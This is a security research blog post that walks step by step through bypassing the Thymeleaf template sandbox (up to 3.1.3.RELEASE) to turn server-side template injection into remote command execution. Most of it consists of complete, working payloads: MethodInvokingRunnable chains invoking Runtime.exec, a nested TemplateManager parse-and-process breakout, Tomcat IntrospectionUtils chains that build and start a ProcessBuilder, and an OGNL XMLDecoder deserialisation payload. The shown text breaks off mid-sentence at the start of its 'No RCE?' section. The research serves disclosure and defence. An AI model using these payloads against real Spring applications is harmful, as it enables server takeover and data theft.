---
layout: posts
title:  From SSTI to SSTI to RCE - Bypassing Thymeleaf sandbox <= 3.1.3.RELEASE
date:   2025-04-26
categories: stuff
---

## Abstract
The Thymeleaf release version 3.0.12 came with improvements in its sandboxed evaluation process, by restricting objects creations and static function calls to be made from within the template. However, there is a specific attribute named `with` (see [chapter **9. Local Variables**](https://www.thymeleaf.org/doc/tutorials/3.1/usingthymeleaf.html#local-variables)) that still allows it. Although some restrictions are in place, I found a first way to bypass the controls of this semi-hardened context and obtain a command execution.

However, if the SSTI occur outside of this `with` attribute, the evaluation context would be much more restricted with no object creation nor static function calls allowed. The article [Spring View Manipulation in Spring Boot 3.1.2](https://noventiq.com/security_blog/spring-view-manipulation-in-spring-boot-3-1-2) by Noventiq discusses some techniques, but they nowadays fail. It appeared that an attacker would be left with simple primitives and some objects exposed by the engine. The documentation lists some of them in [**18 Appendix A: Expression Basic Objects**](https://www.thymeleaf.org/doc/tutorials/3.1/usingthymeleaf.html#appendix-a-expression-basic-objects) and [**19 Appendix B: Expression Utility Objects**](https://www.thymeleaf.org/doc/tutorials/3.1/usingthymeleaf.html#appendix-b-expression-utility-objects) such as `#ctx` or `#execInfo`. The object `#ctx` (class `org.thymeleaf.context.WebEngineContext`) can be used to retrieve a reference to a `TemplateManager` instance (class `org.thymeleaf.engine.TemplateManager`), offering functions to evaluate templates. Then, the idea was to force the application to evaluate a new arbitrary inline template, containing a tag with a `with` attribute, therefore evaluating in a semi-hardened context. Injecting the first payload bypassing the semi-hardened context, I was then able to break outside the strongly sandboxed one.

The bottomline is that the `#ctx` object gives access to really powerful routines, and therefore makes it possible to perform an SSTI from the SSTI, and then turn it into an RCE.

## Intro

Thymeleaf is the default templating engine of Spring Boot applications, making the view creation process highly customisable and smooth.

For this walkthrough we are going to create a basic application with the following dependencies:
```xml
<dependencies>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-web</artifactId>
        <version>3.4.4</version>
    </dependency>

    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-tomcat</artifactId>
        <scope>provided</scope>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-thymeleaf</artifactId>
    </dependency>
</dependencies>
```

The template is as follows, with a simple tag containing the infamous `__...__` sequence (more about this later):

```html
<html lang="en" xmlns:th="http://www.thymeleaf.org">
    <head>
        <meta charset="UTF-8" />
        <title>Document</title>
    </head>
    <body>
    [(__${p}__)]
    </body>
</html>>
```

and the Java class as follows, passing the user input as `p`:

```java
package com.example.spring_boot_web;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;

@Controller
public class MainController {

    @RequestMapping("/test")
    public String index(String p, Model m) throws Exception {
        m.addAttribute("p",p);
        return "index";
    }
}
```

## Hardened and semi-hardened environments

SSTI in Thymeleaf may occur if the template content is built based on the user inputs, or if the latter is used within the preprocessing sequence `__...__`. This is a well known dangerous feature, as described for instance in the article [**Exploiting SSTI in Thymeleaf**](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/) by Acunetix or [**Exploiting SSTI in a Modern Spring Boot Application (3.3.4)**](https://modzero.com/en/blog/spring_boot_ssti/) by ModZero. Every information put between these double underscores would be pre-processed, and its result would be considered as if it took part of the regular template. Obviously, if a user is able to inject malicious content within these preprocessing directives, it would be extremely dangerous. It was therefore known that the following template:

```html
<p>[(__${userinput}__)]</p>
```

could be abused with a payload such as `userinput=${T(java.lang.Runtime).getRuntime().exec('my-evil-command'))}`. Indeed, the string `${T(java.lang.Runtime).getRuntime().exec('my-evil-command'))}` would be processed, and therefore lead to command execution.

However, the release version 3.0.12 improved the security of the solution by denying arbitrary object creations and static functions calls from within the templates, canceling the effect of the previous payload. We are going to refer to it as a _strongly hardened context_.

<img style="margin-left:auto;margin-right:auto;display:block;" alt="Objects creation and static function calls denied" src="/assets/res/stuff/thymeleaf_ssti/error_denied_static.png">

However, these object creations and static functions calls are still possible within a specific attribute offered by Thymeleaf: [`th:with`](https://www.thymeleaf.org/doc/tutorials/3.1/usingthymeleaf.html#local-variables). The latter is meant to declare local variables from within the rendering process, that can be reused later on:

```html
<p th:with="varName=__${userinput}__">Variable is: [(${varName})]</p>
```

Still, this context does not allow everything, and some restrictions are enforced, trying to prevent from dangerous classes and routines invocation. For instance, the whole package `java.*` is denied, except some basic types such as lists, strings, or numbers. Therefore, trying to invoke `Runtime.exec` or `ProcessBuilder.start` would fail (the section [No RCE ?](#no-rce) discusses some possibilities that exist, when RCE is not trivial). We are going to refer to this context as _semi-hardened_.

## Breaking outside the semi-hardened context

At the beginning of this research, I found [this really interesting article](https://noventiq.com/security_blog/spring-view-manipulation-in-spring-boot-3-1-2) by Noventiq (as you probably also did if you were looking for information about SSTI in Thymeleaf), but their techniques did not work anymore against the version 3.1.3.RELEASE, the one I tested. Creating arbitrary classes with `Class.forName` was denied, and I did not want to assume the presence of some third-party libraries.

What is quite interesting to notice regarding the Thymeleaf's filtering process is that it uses a denylist approach. In `ExpressionUtils` class, one can notice that the following packages are denied (except some basic classes):

<img  style="margin-left:auto;margin-right:auto;display:block;" alt="ExpressionUtils class" src="/assets/res/stuff/thymeleaf_ssti/expression_utils.png">


This means that:
* The code of the application itself is not denied
* Lots of potential third-party libraries are allowed
* There are still numerous sub-packages of `org.springframework` that are allowed

Hunting for dangerous classes finally made me stumbled upon the package `org.springframework.scheduling` that did not belong to the denylist. This package contains the class [`MethodInvokingRunnable`](org.springframework.scheduling.support.MethodInvokingRunnable), a subclass or `org.springframework.util.MethodInvoker`. This handy class makes it possible to invoke member methods like this:

```java
MethodInvokingRunnable m = new MethodInvokingRunnable();
m.setTargetObject(theObj);
m.setTargetMethod("the_method");
m.setArguments(arg1, arg2 …);
m.prepare();
m.invoke();
```

or static ones like this:
```java
MethodInvokingRunnable m = new MethodInvokingRunnable();
m.setTargetClass(TheClass.class);
m.setStaticMethod("full.package.name.TheClass.the_method");
m.setArguments(arg1, arg2 …);
m.prepare();
m.invoke();
```

Then, it was quite clear that I could invoke `Runtime.exec` with these three steps:
* obtain a reference to the class `java.lang.Runtime`
* invoke the method `getRuntime` on it
* invoke the method `exec` with the expected arguments

### Step 1 - Get a reference to `Runtime`

This can be done as follows, to invoke `Class.forName`:

```java
MethodInvokingRunnable m = new MethodInvokingRunnable();
m.setTargetClass("".getClass());
m.setStaticMethod("java.lang.Class.forName");
m.setArguments("java.lang.Runtime");
m.prepare();
m.invoke();
```

Within the SSTI payload, one needs to store the `m` variable somehow, hence I used the `setVariable` and `getVariable` routines, as proposed by Noventiq. Quite ugly, but it works. It then gives us this, for this first sub-payload (spaces are new lines added for clarity's sake):

```shell
${
    '' + #ctx.setVariable('a', new org.springframework.scheduling.support.MethodInvokingRunnable()) +
    #ctx.getVariable('a').setTargetClass(''.class) +
    #ctx.getVariable('a').setStaticMethod('java.lang.Class.forName') +
    #ctx.getVariable('a').setArguments('java.lang.Runtime') +
    #ctx.getVariable('a').prepare() +
    #ctx.setVariable('b', #ctx.getVariable('a').invoke())
}
```

Since we will use the values returned by `Class.forName`, we use another temporary variable (named here `b`).

_**Note**: here, we use single quotes to write strings, to avoid the risk of breaking the injection_

## Step 2 - Invoking `getRuntime`

The process repeats here, to invoke `getRuntime` against the obtained class reference:

```java
MethodInvokingRunnable m = new MethodInvokingRunnable();
m.setTargetClass(theClassReference);
m.setStaticMethod("java.lang.Runtime.getRuntime");
// no arguments for getRuntime
m.prepare();
m.invoke();
```

The SSTI payload then becomes:

```shell
${
    '' + #ctx.setVariable('a', new org.springframework.scheduling.support.MethodInvokingRunnable()) + 
    #ctx.getVariable('a').setTargetClass(''.class) + 
    #ctx.getVariable('a').setStaticMethod('java.lang.Class.forName') + 
    #ctx.getVariable('a').setArguments('java.lang.Runtime') + 
    #ctx.getVariable('a').prepare() +
    #ctx.setVariable('b', #ctx.getVariable('a').invoke())+

    #ctx.setVariable('c', new org.springframework.scheduling.support.MethodInvokingRunnable()) +
    #ctx.getVariable('c').setTargetClass(#ctx.getVariable('b')) + 
    #ctx.getVariable('c').setStaticMethod('java.lang.Runtime.getRuntime') + 
    #ctx.getVariable('c').prepare() +
    #ctx.setVariable('d', #ctx.getVariable('c').invoke())
}
```

The object returned by the first function call is stored as `b` and passed to the second one. The same principle will apply with the variable `d`.

## Step 3 - Invoking `exec`

Doing it a third time led to `exec` invocation, in a semi-hardened context. Here, we invoke a member method, hence the use of `setTargetObject` and `setTargetMethod` instead of `setTargetClass` and `setStaticMethod`:

```java
MethodInvokingRunnable m = new MethodInvokingRunnable();
m.setTargetObject(theRuntimeObj);
m.setTargetMethod("exec");
m.setArguments("touch /pwn");
m.prepare();
m.invoke();
```

By putting all the pieces together, we end up with this SSTI payload executing the command `touch /pwn`, valid in a semi-hardened context

```shell
${
    '' + #ctx.setVariable('a', new org.springframework.scheduling.support.MethodInvokingRunnable()) +
    #ctx.getVariable('a').setTargetClass(''.class) +
    #ctx.getVariable('a').setStaticMethod('java.lang.Class.forName') +
    #ctx.getVariable('a').setArguments('java.lang.Runtime') +
    #ctx.getVariable('a').prepare() +
    #ctx.setVariable('b', #ctx.getVariable('a').invoke()) + 
    
    #ctx.setVariable('c', new org.springframework.scheduling.support.MethodInvokingRunnable()) +
    #ctx.getVariable('c').setTargetClass(#ctx.getVariable('b')) +
    #ctx.getVariable('c').setStaticMethod('java.lang.Runtime.getRuntime') + 
    #ctx.getVariable('c').prepare() +
    #ctx.setVariable('d', #ctx.getVariable('c').invoke()) +
    
    #ctx.setVariable('e', new org.springframework.scheduling.support.MethodInvokingRunnable()) +
    #ctx.getVariable('e').setTargetObject(#ctx.getVariable('d')) +
    #ctx.getVariable('e').setTargetMethod('exec') +
    #ctx.getVariable('e').setArguments('touch /pwn') +
    #ctx.getVariable('e').prepare() +
    #ctx.getVariable('e').invoke()
}
```

## Breaking outside a strongly hardened context

Injecting into a strongly hardened context makes the previous payload ineffective, because objects creation are now denied, and therefore preventing us from invoking `new MethodInvokingRunnable`. An attacker is left to the primitive types and a few exposed objects. Exploring a little bit what we can access reveals that we have the following exposed objects:

```
ctx, root, vars, object, locale, conversions, uris, temporals,
calendars, dates, bools, numbers, objects, strings, arrays, lists,
sets, maps, aggregates, messages, ids, execInfo, request, response,
session, servletContext, fields, themes, mvc, requestdatavalues
```

and the following populated variables, accessible through `#ctx.getVariable` (the `p` is the custom one injected from the Java side):

```
org.springframework.web.context.request.async.WebAsyncManager.WEB_ASYNC_MANAGER,
org.springframework.web.servlet.HandlerMapping.bestMatchingHandler,
org.springframework.web.servlet.DispatcherServlet.CONTEXT,
thymeleaf::EvaluationContext,
org.springframework.web.servlet.resource.ResourceUrlProvider,
characterEncodingFilter.FILTERED,
org.springframework.web.util.ServletRequestPathUtils.PATH
org.springframework.web.servlet.DispatcherServlet.LOCALE_RESOLVER,
formContentFilter.FILTERED,
org.springframework.web.servlet.HandlerMapping.bestMatchingPattern,
requestContextFilter.FILTERED,
org.springframework.web.servlet.DispatcherServlet.OUTPUT_FLASH_MAP,
org.springframework.web.servlet.DispatcherServlet.FLASH_MAP_MANAGER,
org.springframework.core.convert.ConversionService,
org.springframework.web.servlet.View.selectedContentType,
org.springframework.web.servlet.HandlerMapping.matrixVariables,
errorPageFilterRegistration.FILTERED, thymeleafRequestContext,
org.springframework.web.servlet.DispatcherServlet.THEME_SOURCE,
springMacroRequestContext,
p,
org.springframework.web.servlet.HandlerMapping.pathWithinHandlerMapping,
org.springframework.web.servlet.HandlerMapping.uriTemplateVariables,
springRequestContext,
org.springframework.web.servlet.DispatcherServlet.THEME_RESOLVER
```


One of these objects (or its aliases) is quite powerful, as it exposes some functions related to the templating engine itself: `#ctx`, being an instance of the class `org.thymeleaf.context.WebEngineContext`. A reference to the class `TemplateManager` can be obtained through the sequence `#ctx.getConfiguration().getTemplateManager()`. Taking a look at the documentation of this class reveals three valuable routines:

<img  style="margin-left:auto;margin-right:auto;display:block;" alt="TemplateManager routines" src="/assets/res/stuff/thymeleaf_ssti/routines_tpl_manager.png">

Then, an idea came to my mind: __*and what if we could leverage the first SSTI in a hardened context, to willingly ask the `TemplateManager` for the evaluation of a new arbitrary inline template, containing a `th:with` attribute, so as to inject our previous payload in a semi-hardened context ?*__

The idea was therefore to invoke first `TemplateManager.parseString` and use its result as a first argument for `TemplateManager.process`, hoping that it would lead to a breakout.

### Invoking `parseString`

As a reminder, we can here only use the exposed objects and their methods. Then the expected arguments for `parseString` could be:

```java
public TemplateHandler parseString(
    TemplateData ownerTemplateData,
    String template,
    int lineOffset,
    int colOffset,
    TemplateMode templateMode,
    boolean useCache);
```

* `ownerTemplateData`: reuse the one exposed by `#ctx.getTemplateData()`. It would be related to the first injected template, but it does not really matter
* `template`: the arbitrary inline template that we want to evaluate, with the `th:with` attribute. For the moment, it may be something like `'<p th:with="x=${T(java.lang.Runtime)}">[(${x})]</p>'`
* `lineOffset` and `colOffset`: may be set to 0, to process the whole template
* `templateMode`: we can reuse the one of the current context (`TemplateMode.HTML` in this case), with the call `#ctx.getTemplateMode()`
* `useCache`: set it to `false` to force re-processing

Therefore, the invocation from the SSTI payload looks like (spaces and new lines added for readability):

```shell
${
    #ctx.getConfiguration().getTemplateManager().parseString(
        #ctx.getTemplateData(),
        '<p+th:with="x=${T'%2b'(java.lang.Runtime)}">[(${x})]</p>',
        0,
        0,
        #ctx.getTemplateMode(),
        false
    )
}
```

One thing is important to notice here: to avoid triggering the expression filter too early, I split the template between the `T` and the `(`, supposed to refer to a class, generally used to perform a static method invocation (`T(com.package.Class).method(...)`). The `%2b` is a `+` symbol encoded as URL, performing a concatenation.

<img  style="margin-left:auto;margin-right:auto;display:block;" alt="Call to parseString" src="/assets/res/stuff/thymeleaf_ssti/parsestring.png">

### Invoking `process`

This one was trickier and took me time to solve. While the two first arguments are easy to obtain (previous method invocation and current context `#ctx`), the last one was quite hidden:

```java
public void process(TemplateModel template, ITemplateContext context, Writer writer)
```

The argument `writer` should be an instance of an implementation of the interface `java.io.Writer`. At first glance, it seemed that no routine from `#ctx` would directly or indirectly return an instance of a `Writer`. Moreover, the objects `#request`, `#response`, `#session` and `#servletContext` are denied, although they are exposed by the engine. I knew that in older versions, it would have been easy to get a `Writer` from the `#response`, but now it is no more the case.

And finally, after a while, I found what I was looking for:

```shell
#ctx.getVariable('org.springframework.web.context.request.async.WebAsyncManager.WEB_ASYNC_MANAGER').
getAsyncWebRequest().getNativeResponse().getWriter()
```

It is worth noting that `process` would not complain if the passed `Writer` is set to `null`, and specific paths are designed for such a case. But at one moment, it would fail because another member variable is set based on the existence of `writer`, and the absence of this variable (`this.next` in `org.thymeleaf.engine.AbstractTemplateHandler`) would then raise a `NullPointerException`, leading to an error.

Therefore, the payload becomes:

```shell
${
    #ctx.getConfiguration().getTemplateManager().process(
        #ctx.getConfiguration().getTemplateManager().parseString(
            #ctx.getTemplateData(),
            '<p+th:with="x=${T'%2b'(java.lang.Runtime)}">[(${x})]</p>',
            0,
            0,
            #ctx.getTemplateMode(),
            false),
        #ctx,
        #ctx.getVariable('org.springframework.web.context.request.async.WebAsyncManager.WEB_ASYNC_MANAGER').getAsyncWebRequest().getNativeResponse().getWriter()
    )
}
```

Sending this as parameter `p` would make the application display the following message in its error logs:


<img  style="margin-left:auto;margin-right:auto;display:block;" alt="Process error" src="/assets/res/stuff/thymeleaf_ssti/process_error.png">


<img  style="margin-left:auto;margin-right:auto;display:block;" alt="Process error - 1" src="/assets/res/stuff/thymeleaf_ssti/process_error1.png">

Seeing such an error is actually good news for us, because it means that the engine complains about the fact that we try to get access to a forbidden class, from within a semi-hardened context. Otherwise, in a strongly hardened one, we would have received the other message stating that instantiation and static functions calls are denied. We then achieved the second breakout !

## Complete breakout

Now, it is time to combine the two payloads, to leverage the double breakout ! To make things easier, I decided to pass the payload with the `MethodInvokingRunnable` as another POST parameter, to avoid bad escape sequences and early filter denial. Dynamically, the injected SSTI will retrieve the second parameter to build the inline template.

First parameter, as `qwertz` (URL-encoded, new lines added for readability):

```shell
qwertz=${
    '' %2b #ctx.setVariable('a',new+org.springframework.scheduling.support.MethodInvokingRunnable()) %2b
    #ctx.getVariable('a').setTargetClass(''.class) %2b
    #ctx.getVariable('a').setStaticMethod('java.lang.Class.forName') %2b
    #ctx.getVariable('a').setArguments('java.lang.Runtime') %2b
    #ctx.getVariable('a').prepare() %2b 
    #ctx.setVariable('b',#ctx.getVariable('a').invoke()) %2b
    #ctx.setVariable('c',new+org.springframework.scheduling.support.MethodInvokingRunnable()) %2b
    #ctx.getVariable('c').setTargetClass(#ctx.getVariable('b')) %2b
    #ctx.getVariable('c').setStaticMethod('java.lang.Runtime.getRuntime') %2b
    #ctx.getVariable('c').prepare() %2b
    #ctx.setVariable('d',#ctx.getVariable('c').invoke()) %2b
    #ctx.setVariable('e',new+org.springframework.scheduling.support.MethodInvokingRunnable()) %2b
    #ctx.getVariable('e').setTargetObject(#ctx.getVariable('d')) %2b
    #ctx.getVariable('e').setTargetMethod('exec') %2b
    #ctx.getVariable('e').setArguments('touch /pwn') %2b
    #ctx.getVariable('e').prepare() %2b
    #ctx.getVariable('e').invoke()
}
```

And then the `p`:

```shell
p=${
    #ctx.getConfiguration().getTemplateManager().process(
        #ctx.getConfiguration().getTemplateManager().parseString(
            #ctx.getTemplateData(),
            '<p+th:with="x='%2b#ctx.getVariable('org.springframework.web.context.request.async.WebAsyncManager.WEB_ASYNC_MANAGER').getAsyncWebRequest().getNativeRequest().getParameter('qwertz')%2b'">[(${x})]</p>',
            0,
            0,
            #ctx.getTemplateMode(),
            false
        ),
        #ctx,
        #ctx.getVariable('org.springframework.web.context.request.async.WebAsyncManager.WEB_ASYNC_MANAGER').getAsyncWebRequest().getNativeResponse().getWriter()
    )
}
```

Combining these two payloads then returns a concatenation of `null` values, which is intended (returned by the intermediate `setVariable`), but now, a file named `pwn` should be placed at the root of the filesystem (:

<img  style="margin-left:auto;margin-right:auto;display:block;" alt="Complete bypass" src="/assets/res/stuff/thymeleaf_ssti/pwn.png">

## Bypassing Spring Boot web starter

Another approach could be used to escape the semi-hardened context, if the application uses the following dependency:

```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
</dependency>
```

This package gives access to two interesting classes offering reflection capabilities: `org.apache.tomcat.util.IntrospectionUtils` and `org.apache.el.util.ReflectionUtil`. Both do not belong to the denylist of `ExpressionUtils`, and can therefore be used to retrieve references to the `ProcessBuilder` class, and turn it into command execution.

### Invoking `callMethodN`

The class [`IntrospectionUtils`](https://tomcat.apache.org/tomcat-10.0-doc/api/org/apache/tomcat/util/IntrospectionUtils.html) offers a series of interesting methods, including `callMethodN`:


```java
static Object callMethodN​(
    Object target, //the subject
    String methodN, //the method 
    Object[] params, //array of params
    Class<?>[] typeParams); //same size, representing the types of the params
```

here, the idea was to leverage `ProcessBuilder.start` instead of `Runtime.exec`, because there was a catch. Taking  a look at the method code, one can see that introspection is made to retrieve the method based on target's class:

<img  style="margin-left:auto;margin-right:auto;display:block;" alt="callMethodN" src="/assets/res/stuff/thymeleaf_ssti/callMethodN.png">

Then, if we want to invoke `Runtime.exec`, the first parameter must be an instance of `java.lang.Runtime` and not the `Runtime` class itself. Indeed, passing `Runtime.class` as the first argument would invoke `getClass` once again, and therefore look for `Class.getRuntime` which obviously does not exist. In other words, this technique is not really suitable for static methods invocation, hence the use of `ProcessBuilder`.

The steps where therefore as follows:
* retrieve a reference to the `ProcessBuilder` class
* from this class, retrieve its constructors
* invoke `newInstance` on a constructor to create a `ProcessBuilder` instance with the appropriate arguments
* then invoke `start` without arguments

Let's see how it works.

### Step 1 - Get a reference to `java.lang.ProcessBuilder`

From a Java point of view, the goal is to call `Class.forName`. As I wrote, static methods works quite bad, but here, I will pass a reference to `String.class`, and then `getClass()` from `callMethodN` will return the class `Class`, so it is fine. In Java, it could be something like:

```java
Runtime.class = IntrospectionUtils.callMethodN(
    "".getClass(),
    "forName",
    new Object[]{"java.lang.Runtime"},
    new Class[]{String.class}
);
```

Within the SSTI payload, it is however quite different: how do we pass array, especially the 4th parameter, the arrays of types, since the sandbox denies the use of the generic type `java.lang.Class` ?

Actually, one could leverage here the power of the routine [`ReflectionUtil.toTypeArray​`](https://tomcat.apache.org/tomcat-10.0-doc/api/org/apache/el/util/ReflectionUtil.html):

```java
static Class<?>[] toTypeArray(​String[] s)
```

From an array of String representing the classes, it returns an array of type. For instance:

```java
toTypeArray(new String[]["java.lang.Integer", "java.lang.String"]) 
```

returns:

```java
Class[] types = new Class[]{Integer.class, String.class}
```

So now, the only thing to do is to pass array of `String`s !

To keep it quite simple, I used here a small trick with the `split` routine to easily create array of strings, and avoid a cumbersome array creation process. The first SSTI payload then becomes:

```shell
${T(org.apache.tomcat.util.IntrospectionUtils).callMethodN(
    ''.class,
    'forName',
    'java.lang.ProcessBuilder'.split(';'),
    T(org.apache.el.util.ReflectionUtil).toTypeArray('java.lang.String'.split(';'))
)}
```

_Note: although there is only one parameter for `Class.forName`, the routine `callMethodN` expects arrays for the 3rd and 4th argument, hence the quite useless `split` invocations_

### Retrieve the constructors

Now, it is time to obtain the list of possible constructors supported by the class `ProcessBuilder`. Since `getConstructors` come from the class `Class`, we can invoke `callMethodN` by passing the reference to the class `ProcessBuilder` we just obtained.

In this case, `ProcessBuilder` supports two constructors:

```java
public ProcessBuilder(List<String> args);
public ProcessBuilder(String[] args);
```

_I decided to go with the second one, but they can be both used._

In Java, the invocation would look like this:

```java
Constructor c = IntrospectionUtils.callMethodN(
    ProcessBuilder.class,
    "getConstructors",
    null,
    null
)[1];
```

Within an SSTI payload it would therefore be:

```shell
${T(org.apache.tomcat.util.IntrospectionUtils).callMethodN( theRuntimeClassRef ,'getConstructors',null,null)[1]}
```

By combining it with the payload of the previous step, we obtain:

```shell
${
    T(org.apache.tomcat.util.IntrospectionUtils).callMethodN(
        T(org.apache.tomcat.util.IntrospectionUtils).callMethodN(
            ''.class,
            'forName',
            'java.lang.ProcessBuilder'.split(';'),
            T(org.apache.el.util.ReflectionUtil).toTypeArray('java.lang.String'.split(';'))),
        'getConstructors',
        null,
        null
    )[1]
}
```

### Step 3 - Invoking the constructor

Once we select the second constructor (the one that takes an array of `String`s as argument), we can invoke the routine [`newInstance`](https://docs.oracle.com/javase/8/docs/api/java/lang/reflect/Constructor.html#newInstance-java.lang.Object...-) on it. The latter takes as argument an array of objects, that are actually simply forwarded to the class's constructor. In other words, we invoke `newInstance` how we would normally invoke the `ProcessBuilder`'s constructor:

```java
public T newInstance(Object... initargs)
    throws InstantiationException,
            IllegalAccessException,
            IllegalArgumentException,
            InvocationTargetException
```

What is trickier here, is that the constructor expects an array of `String`s, and then the invocation to `callMethodN` should be like this, with an array of `String`s embedded in an array of `Object`s

```java
ProcessBuilder p = theConstructor.newInstance(
    new Object[]{
        new String[]{
            "cmd", "arg1", ...
        }
    });

//then
ProcessBuilder p = IntrospectionUtils.callMethod(
    theConstructor,
    "newInstance",
    new Object[]{
        new Object[]{
            Arrays.asList("cmd", "arg1", "arg2", ...)
        }
    },
    new Class[]{Object[].class}
);
```

Quite ugly, but I first created the embedded arrays like this in the SSTI payload, chained with a concatenation operator:

```shell
#ctx.setVariable('a', 'mkdir;/pwn'.split(';')) +
#ctx.setVariable('b', new java.util.ArrayList()) + 
#ctx.getVariable('b').add(#ctx.getVariable('a')) + 
#ctx.setVariable('c', #ctx.getVariable('b').toArray()) + 
#ctx.setVariable('d', new java.util.ArrayList()) + 
#ctx.getVariable('d').add(#ctx.getVariable('c')) + 
#ctx.setVariable('e', #ctx.getVariable('d').toArray())
```

Then, it is possible to pass the variable `e` as argument for `callMethodN`:

```shell
${
    '' + #ctx.setVariable('a', 'mkdir;/pwn'.split(';')) +
    #ctx.setVariable('b',new java.util.ArrayList()) + 
    ctx.getVariable('b').add(#ctx.getVariable('a')) +
    #ctx.setVariable('c', #ctx.getVariable('b').toArray()) + 
    #ctx.setVariable('d', new java.util.ArrayList()) + 
    #ctx.getVariable('d').add(#ctx.getVariable('c')) + 
    #ctx.setVariable('e', #ctx.getVariable('d').toArray()) + 
    T(org.apache.tomcat.util.IntrospectionUtils).callMethodN(
        T(org.apache.tomcat.util.IntrospectionUtils).callMethodN(
            T(org.apache.tomcat.util.IntrospectionUtils).callMethodN(
                ''.class,
                'forName',
                'java.lang.ProcessBuilder'.split(';'),
                T(org.apache.el.util.ReflectionUtil).toTypeArray('java.lang.String'.split(';'))
            ),
            'getConstructors',
            null,
            null
        )[1],
        'newInstance',
        #ctx.getVariable('e'),
        T(org.apache.el.util.ReflectionUtil).toTypeArray('java.lang.Object[]'.split(';'))
    )
}
```

### Invoke `start`

Finally, once we obtain a newly created `ProcessBuilder` instance, the same process repeats by invoking the `start` routine:

```shell
${
    ''+
    #ctx.setVariable('a','mkdir;/pwn'.split(';')) +
    #ctx.setVariable('b', new java.util.ArrayList()) +
    #ctx.getVariable('b').add(#ctx.getVariable('a')) +
    #ctx.setVariable('c', #ctx.getVariable('b').toArray()) +
    #ctx.setVariable('d',new java.util.ArrayList()) +
    #ctx.getVariable('d').add(#ctx.getVariable('c')) +
    #ctx.setVariable('e', #ctx.getVariable('d').toArray()) +
    T(org.apache.tomcat.util.IntrospectionUtils).callMethodN(
        T(org.apache.tomcat.util.IntrospectionUtils).callMethodN(
            T(org.apache.tomcat.util.IntrospectionUtils).callMethodN(
                T(org.apache.tomcat.util.IntrospectionUtils).callMethodN(
                    ''.class,
                    'forName',
                    'java.lang.ProcessBuilder'.split(';'),
                    T(org.apache.el.util.ReflectionUtil).toTypeArray('java.lang.String'.split(';'))
                ),
                'getConstructors',
                null,
                null
            )[1],
            'newInstance',
            #ctx.getVariable('e'),
            T(org.apache.el.util.ReflectionUtil).toTypeArray('java.lang.Object[]'.split(';'))
        ),
        'start',
        null,
        null
    )
}
```

And that's it!

<img  style="margin-left:auto;margin-right:auto;display:block;" alt="Rce tomcat" src="/assets/res/stuff/thymeleaf_ssti/rce_tomcat.png">


## Bypassing with `ognl`

_Variable expressions_ in Thymeleaf are written in SpEL (Spring Expression Languages), a version of the [OGNL](https://commons.apache.org/dormant/commons-ognl/language-guide.html) language. When Thymeleaf is integrated to Spring Boot with appropriate starter modules, the OGNL support would be discarded, and SpEL used by default instead. However, if Thymeleaf is integrated to the Spring Framework with more manual configuration, then OGNL libraries may also be included. It appears that they also offer some breakout techniques.

Let's give it a try with the following dependencies:

```xml
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-tomcat</artifactId>
            <scope>provided</scope>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-thymeleaf</artifactId>
        </dependency>
        <dependency>
            <groupId>ognl</groupId>
            <artifactId>ognl</artifactId>
            <version>3.4.7</version>
        </dependency>
```

It should also be included if Thymeleaf is included like this instead:
```xml
<dependency>
    <groupId>org.thymeleaf</groupId>
    <artifactId>thymeleaf</artifactId>
    <version>3.1.3.RELEASE</version>
</dependency>
```

Basically, to invoke `Runtime.getRuntime`, one would write such a payload, leveraging the routine `getValue(String expression, Object root)`: 

```shell
${
    T(ognl.Ognl).getValue('@java.lang.Runtime@getRuntime()', null)
}
```

However, an error would be raised, since we are trying to obtain a reference to a forbidden class:

<img  style="margin-left:auto;margin-right:auto;display:block;" alt="OGNL deny 1" src="/assets/res/stuff/thymeleaf_ssti/ognl_deny1.png">

<img  style="margin-left:auto;margin-right:auto;display:block;" alt="OGNL deny 2" src="/assets/res/stuff/thymeleaf_ssti/ognl_deny2.png">


One can see that trying to execute `Runtime.exec` or `ProcessBuilder.start` would be denied, but the denylist is rather short and quite easy to bypass. I guess that there a numerous ways to achieve code execution, so I decided to pick one of the easiest: creating a `java.beans.XMLDecoder` arbitrary object and invoke an unsafe deserialisation (from SSTI to SSTI to unsafe deserialisation to RCE :laughing:)

There is still a little trick here: from within the OGNL expression, we will need to also pass some `String`s for the XML stream (we would need it anyway to pass the commands). However, using single quotes would break the main payload, and using double ones would mess with the `th:with` attribute. However, we cannot simply escape these symbols, since the SpEL parser would complain about it:

<img  style="margin-left:auto;margin-right:auto;display:block;" alt="Tokenizer" src="/assets/res/stuff/thymeleaf_ssti/tokenizer.png">

A possible approach would be to use concatenation of `Character.toString` but it would be cumbersome, hence I decided to pass it as another POST parameter. So let's split the payload:

**XML stream to deserialise**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_102" class="java.beans.XMLDecoder">
    <object class="java.lang.Runtime" method="getRuntime">
        <void method="exec">
            <array class="java.lang.String" length="3">
                <void index="0">
                    <string>bash</string>
                </void>
                <void index="1">
                    <string>-c</string>
                </void>
                <void index="2">
                    <string>mkdir /pwn</string>
                </void>
            </array>
        </void>
    </object>
</java>
```

We will need to URL-encode it.

And then, finally:

```shell
${
    T(ognl.Ognl).getValue(
        '#xml = new java.beans.XMLDecoder(new java.io.ByteArrayInputStream(' +
        #ctx.getVariable('org.springframework.web.context.request.async.WebAsyncManager.WEB_ASYNC_MANAGER').getAsyncWebRequest().getNativeRequest().getParameter('payload') +
        '.getBytes())),#xml.readObject()',
    null)
}
```

<img  style="margin-left:auto;margin-right:auto;display:block;" alt="OGNl exploit" src="/assets/res/stuff/thymeleaf_ssti/pwn_ognl.png">


<a name="no-rce"></a>
## No RCE ? 

It is really frustrating, but sometimes, SSTI might not lead to RCE directly or indirectly thanks to reflection as we did. Still, should it happens, other ways are worth being explored, such as:
